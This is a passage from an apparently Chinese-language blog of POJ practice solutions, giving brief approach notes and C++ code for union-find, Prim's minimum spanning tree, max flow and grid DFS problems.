<h3 id="提交-1"><a href="#提交-1" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_N 500000</span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> ans;</div><div class="line"><span class="keyword">int</span> par[MAX_N];</div><div class="line"><span class="keyword">int</span> ran[MAX_N];</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_set</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i &lt;= n ; i++)&#123;</div><div class="line">        par[i] = i;</div><div class="line">        ran[i] = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_set</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> i = x;</div><div class="line">    <span class="keyword">while</span>(par[i] != i) &#123;</div><div class="line">        i = par[i];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(par[x] != i)&#123;</div><div class="line">        <span class="keyword">int</span> next;</div><div class="line">        next = par[x];</div><div class="line">        par[x] = i;</div><div class="line">        x = next;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> i;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">same_set</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> find_set(x) == find_set(y);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">union_set</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> root_x = find_set(x);</div><div class="line">    <span class="keyword">int</span> root_y = find_set(y);</div><div class="line">    <span class="keyword">if</span> (root_x == root_y)</div><div class="line">        <span class="keyword">return</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (par[root_x] &gt; par[root_y])&#123;</div><div class="line">        par[root_y] = root_x;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        par[root_x] = root_y;</div><div class="line">        <span class="keyword">if</span> (ran[root_x] == ran[root_y])</div><div class="line">            ran[root_y]++;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,k;</div><div class="line">    ans = <span class="number">0</span>;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;k);</div><div class="line">    init_set(n*<span class="number">3</span>);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++)&#123;</div><div class="line">        <span class="keyword">int</span> d,x,y;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;d,&amp;x,&amp;y);</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (x &lt; <span class="number">1</span> || x &gt; n || y &lt; <span class="number">1</span> || y &gt; n)&#123;</div><div class="line">            ans++;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ( d == <span class="number">1</span>)&#123;</div><div class="line">            <span class="keyword">if</span> ( same_set(x,y+n) || same_set(x,y+<span class="number">2</span>*n) || same_set(x+n,y) || same_set(x+n,y+<span class="number">2</span>*n) || same_set(x+<span class="number">2</span>*n,y) || same_set(x+<span class="number">2</span>*n,y+n) )&#123;</div><div class="line">                ans++;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                union_set(x,y);</div><div class="line">                union_set(x+n,y+n);</div><div class="line">                union_set(x+<span class="number">2</span>*n,y+<span class="number">2</span>*n);</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">if</span> (same_set(x,y)|| same_set(x,y+<span class="number">2</span>*n) || same_set(x+n,y+n) ||same_set(x+n,y) || same_set(x+<span class="number">2</span>*n,y+n) || same_set(x+<span class="number">2</span>*n,y+<span class="number">2</span>*n))&#123;</div><div class="line">                ans++;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                union_set(x,y+n);</div><div class="line">                union_set(x+n,y+<span class="number">2</span>*n);</div><div class="line">                union_set(x+<span class="number">2</span>*n,y);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1258"><a href="#1258" class="headerlink" title="1258"></a>1258</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=1258" target="_blank" rel="external">http://poj.org/problem?id=1258</a></p>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>最小生成树。</p>
<h3 id="提交-2"><a href="#提交-2" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 105</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xFFFFFF</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> cost[MAX][MAX] ;</div><div class="line"><span class="keyword">int</span> mincost[MAX];</div><div class="line"><span class="keyword">bool</span> used[MAX];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">prim</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        mincost[i] = INF;</div><div class="line">        used[i] = <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">    mincost[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> ( <span class="literal">true</span> )&#123;</div><div class="line">        <span class="keyword">int</span> v = <span class="number">-1</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> ( <span class="keyword">int</span> u = <span class="number">0</span>; u &lt; n; u++)&#123;</div><div class="line">            <span class="keyword">if</span> ( !used[u] &amp;&amp; ( v == <span class="number">-1</span> || mincost[u] &lt; mincost[v]))</div><div class="line">                v = u;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ( v == <span class="number">-1</span> )</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        used[v] = <span class="literal">true</span>;</div><div class="line">        res += mincost[v];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> u = <span class="number">0</span>; u &lt; n; u++)</div><div class="line">            mincost[u] = min(mincost[u], cost[v][u]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> res;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n) != EOF )&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</div><div class="line">                cost[i][j] = INF;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n ; j++)</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;cost[i][j]);</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,prim());</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1273"><a href="#1273" class="headerlink" title="1273"></a>1273</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=1273" target="_blank" rel="external">http://poj.org/problem?id=1273</a></p>
<h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>模板题目，直接求最大流就可以。<br>我用了vector来构造邻接表，而这题的输入时一次包含了很多个测试例子。所以每次读完后都需要对邻接表进行初始化，即进行下面的操作：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++ )</div><div class="line">	G[i].clear();</div></pre></td></tr></table></figure></p>
<p>方法是网上找的，网上说这样清空了元素，但不会回收内存。</p>
<h3 id="提交-3"><a href="#提交-3" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 205</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x7fffffff</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">struct</span> edge &#123;<span class="keyword">int</span> to ,cap, rev;&#125;;</div><div class="line"><span class="built_in">vector</span>&lt;edge&gt; G[MAX];</div><div class="line"><span class="keyword">bool</span> used[MAX];</div><div class="line"><span class="keyword">int</span> n,m;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_edge</span><span class="params">(<span class="keyword">int</span> from, <span class="keyword">int</span> to,<span class="keyword">int</span> cap)</span></span>&#123;</div><div class="line">    edge one,two;</div><div class="line">    one.to = to;</div><div class="line">    one.cap = cap;</div><div class="line">    one.rev = (<span class="keyword">int</span>)(G[to].size());</div><div class="line">    G[from].push_back(one);</div><div class="line">    two.to = from;</div><div class="line">    two.cap = <span class="number">0</span>;</div><div class="line">    two.rev = (<span class="keyword">int</span>)(G[from].size()<span class="number">-1</span>);</div><div class="line">    G[to].push_back(two);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> v, <span class="keyword">int</span> t, <span class="keyword">int</span> f)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> ( v == t)</div><div class="line">        <span class="keyword">return</span> f;</div><div class="line">    used[v] = <span class="literal">true</span>;</div><div class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="keyword">int</span>)G[v].size(); i++)&#123;</div><div class="line">        edge &amp;e = G[v][i];</div><div class="line">        <span class="keyword">if</span> ( !used[e.to] &amp;&amp; e.cap &gt; <span class="number">0</span>)&#123;</div><div class="line">            <span class="keyword">int</span> d = dfs(e.to,t, f &gt; e.cap?e.cap:f);</div><div class="line">            <span class="keyword">if</span> ( d &gt; <span class="number">0</span>) &#123;</div><div class="line">                e.cap -= d;</div><div class="line">                G[e.to][e.rev].cap += d;</div><div class="line">                <span class="keyword">return</span> d;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_flow</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> t)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> flow = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (;;)&#123;</div><div class="line">        <span class="built_in">memset</span>(used, <span class="number">0</span>, <span class="keyword">sizeof</span>(used));</div><div class="line">        <span class="keyword">int</span> f = dfs(s,t,INF);</div><div class="line">        <span class="keyword">if</span> (f == <span class="number">0</span>) <span class="keyword">return</span> flow;</div><div class="line">        flow += f;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m) != EOF)&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++ )</div><div class="line">            G[i].clear();</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">            <span class="keyword">int</span> s, t,c;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;s,&amp;t,&amp;c);</div><div class="line">            add_edge(s,t,c);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,max_flow(<span class="number">1</span>,m));</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1979"><a href="#1979" class="headerlink" title="1979"></a>1979</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=1979" target="_blank" rel="external">http://poj.org/problem?id=1979</a></p>
<h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>DFS()</p>
<h3 id="提交-4"><a href="#提交-4" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> X 20</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> Y 20</span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> x,y;</div><div class="line"><span class="keyword">int</span> nx,ny;</div><div class="line"><span class="keyword">int</span> sx,sy;</div><div class="line"><span class="keyword">int</span> num;</div><div class="line"><span class="keyword">char</span> maze[X][Y];</div><div class="line"><span class="keyword">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> dy[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> r, <span class="keyword">int</span> s)</span></span>&#123;</div><div class="line">    num += <span class="number">1</span>;</div><div class="line">    maze[r][s] = <span class="string">'#'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</div><div class="line">        <span class="keyword">int</span> t1 = r+dx[i];</div><div class="line">        <span class="keyword">int</span> t2 = s+dy[i];</div><div class="line">        <span class="keyword">if</span> (<span class="number">0</span> &lt;= t1 &amp;&amp; t1 &lt; x &amp;&amp; <span class="number">0</span> &lt;= t2 &amp;&amp; t2 &lt; y &amp;&amp; maze[t1][t2] == <span class="string">'.'</span>)&#123;</div><div class="line">            dfs(t1,t2);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;y,&amp;x);</div><div class="line"></div><div class="line">    <span class="keyword">while</span>( x != <span class="number">0</span> &amp;&amp; y != <span class="number">0</span>)&#123;</div><div class="line">        num  = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; x; i++)&#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; y; j++)&#123;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"\n%c"</span>,&amp;maze[i][j]);</div><div class="line">                <span class="keyword">if</span> (maze[i][j] == <span class="string">'@'</span>)&#123;</div><div class="line">                    sx = i;</div><div class="line">                    sy = j;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        dfs(sx,sy);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,num);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;y,&amp;x);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="2236"><a href="#2236" class="headerlink" title="2236"></a>2236</h2><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=2236" target="_blank" rel="external">http://poj.org/problem?id=2236</a></p>
<h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><p>并查集。用结构体数组来作为节点，repair表示是否已经修理过，par表示其父节点。其余利用并查集即可。</p>
<h3 id="提交-5"><a href="#提交-5" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_N 1002</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> node&#123;</div><div class="line">    <span class="keyword">int</span> repair;</div><div class="line">    <span class="keyword">int</span> par;</div><div class="line">&#125;computer[MAX_N];</div><div class="line"><span class="keyword">int</span> ran[MAX_N];</div><div class="line"><span class="keyword">struct</span> loc&#123;</div><div class="line">    <span class="keyword">int</span> x;</div><div class="line">    <span class="keyword">int</span> y;</div><div class="line">&#125;zuobiao[MAX_N];</div><div class="line"><span class="keyword">int</span> n,d;</div><div class="line"><span class="keyword">int</span> p,q;</div><div class="line"><span class="keyword">char</span> op;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_set</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i &lt;= n; i++)&#123;</div><div class="line">        computer[i].repair = <span class="number">0</span>;</div><div class="line">        computer[i].par = i;</div><div class="line">        ran[i] = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_root</span><span class="params">(<span class="keyword">int</span> q)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> i = q;</div><div class="line">    <span class="keyword">while</span>(computer[i].par != i)&#123;</div><div class="line">        i = computer[i].par;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">while</span>(computer[q].par != i)&#123;</div><div class="line">        <span class="keyword">int</span> temp = computer[q].par;</div><div class="line">        computer[q].par = i;</div><div class="line">        q = temp;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> i;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">same_set</span><span class="params">(<span class="keyword">int</span> p,<span class="keyword">int</span> q)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> find_root(p) == find_root(q);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">union_set</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> p_root = find_root(p);</div><div class="line">    <span class="keyword">int</span> q_root = find_root(q);</div><div class="line">    <span class="keyword">if</span> (p_root == q_root)</div><div class="line">        <span class="keyword">return</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(ran[p_root] &gt; ran[q_root])&#123;</div><div class="line">        computer[q_root].par = p_root;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        computer[p_root].par = q_root;</div><div class="line">        <span class="keyword">if</span> (ran[p_root] == ran[q_root])&#123;</div><div class="line">            ran[q_root]++;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal_distance</span><span class="params">(<span class="keyword">int</span> p,<span class="keyword">int</span> q)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> (zuobiao[p].x-zuobiao[q].x)*(zuobiao[p].x-zuobiao[q].x)+(zuobiao[p].y-zuobiao[q].y)*(zuobiao[p].y-zuobiao[q].y);</div><div class="line">&#125;</div><div class="line"><span 